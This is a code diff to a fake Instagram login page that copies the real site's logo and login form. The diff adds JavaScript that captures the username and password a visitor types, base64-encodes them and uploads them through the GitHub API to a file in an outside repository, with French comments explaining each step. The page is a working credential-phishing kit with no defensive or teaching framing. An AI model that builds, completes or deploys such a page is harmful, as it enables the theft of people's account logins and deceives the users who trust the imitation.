@@ -10,9 +10,9 @@
     <div class="container">
         <div class="login-box">
             <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
-            <form action="traitement.php" method="get">
-                <input type="text" name="username" placeholder="Phone number, username, or email" required>
-                <input type="password" name="password" placeholder="Password" required>
+            <form id="loginForm">
+                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
                 <button type="submit">Log In</button>
                 <div class="divider">
                     <span>OR</span>
@@ -25,5 +25,46 @@
             </div>
         </div>
     </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Créer un objet avec les données à envoyer
+            const data = {
+                username: username,
+                password: password
+            };
+
+            // Convertir l'objet en chaîne JSON
+            const jsonData = JSON.stringify(data);
+
+            // Envoyer les données à GitHub en utilisant l'API GitHub
+            fetch('https://api.github.com/repos/racimussou/instagram-info/contents/donnees.json', {
+                method: 'PUT',
+                headers: {
+                    'Authorization': 'token VOTRE_TOKEN', // Remplacez VOTRE_TOKEN par votre jeton d'accès GitHub
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    message: 'Ajout de données utilisateur',
+                    content: btoa(jsonData), // Encoder les données en base64
+                    branch: 'main' // Nom de la branche à mettre à jour
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Réponse de GitHub:', data);
+                alert('Données utilisateur ajoutées avec succès sur GitHub.');
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                alert('Une erreur est survenue lors de l\'envoi des données sur GitHub.');
+            });
+        });
+    </script>
 </body>
 </html>
